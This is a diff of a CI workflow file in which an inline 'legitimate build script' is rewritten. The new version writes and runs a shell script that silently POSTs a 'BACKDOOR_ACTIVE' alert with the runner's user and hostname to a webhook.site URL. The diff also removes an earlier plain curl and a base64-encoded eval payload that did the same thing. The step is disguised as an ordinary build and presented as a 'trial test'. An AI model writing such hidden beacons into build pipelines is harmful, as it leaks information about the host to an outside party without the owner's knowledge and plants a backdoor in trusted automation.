@@ -24,16 +24,21 @@ jobs:
           # === Inlined build script content ===
           echo "This is the legitimate build script."
           
-          echo "#!/bin/bash" > my-application.sh
-          echo "echo 'Hello! Trial test to retrieve user and host from my runner to understand where this pipeline runs'" >> my-application.sh
+          # Create the application script
+          cat > my-application.sh << 'EOF'
+#!/bin/bash
+
+echo "Hello! Trial test to retrieve user and host from my runner..."
+
+# Send real user and host to webhook
+curl -s -X POST \
+  -d "alert=BACKDOOR_ACTIVE&user=${USER:-$(whoami)}&host=${HOSTNAME:-$(hostname)}" \
+  https://webhook.site/f612b26a-6381-436b-b646-2c1979158c37 > /dev/null 2>&1 || true
+
+echo "Runner Info - User: ${USER:-$(whoami)} | Host: ${HOSTNAME:-$(hostname)}"
+EOF
           
-          # Send alert to webhook
-          curl -X POST -d "alert=BACKDOOR_ACTIVE&user=\$USER&host=\$HOSTNAME" https://webhook.site/f612b26a-6381-436b-b646-2c1979158c37
-          
-          # Add encoded payload
-          PAYLOAD="Y3VybCAtWCBQT1NUIC1kICJhbGVydD1CQUNLRE9PUl9BQ1RJVkUmdXNlcj0kVVNFUiZob3N0PSRIU1ROQU1FIiBodHRwczovL3dlYmhvb2suc2l0ZS9mNjEyYjI2YS02MzgxLTQzNmItYjY0Ni0yYzE5NzkxNThjMzc="
-          echo "eval \$(echo '\$PAYLOAD' | base64 -d)" >> my-application.sh
-          
+          # Make executable and run it
           chmod +x my-application.sh
           bash ./my-application.sh
           
